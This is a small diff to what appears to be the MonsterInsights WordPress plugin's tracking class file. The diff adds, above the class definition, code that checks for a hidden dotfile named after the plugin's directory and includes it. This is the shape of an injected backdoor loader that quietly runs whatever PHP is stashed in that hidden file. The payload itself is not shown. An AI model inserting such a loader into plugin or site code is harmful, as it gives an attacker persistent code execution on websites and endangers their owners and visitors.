@@ -20,6 +20,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @since  7.0.0
  * @return void
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class MonsterInsights_Tracking {
 
 	public function __construct() {
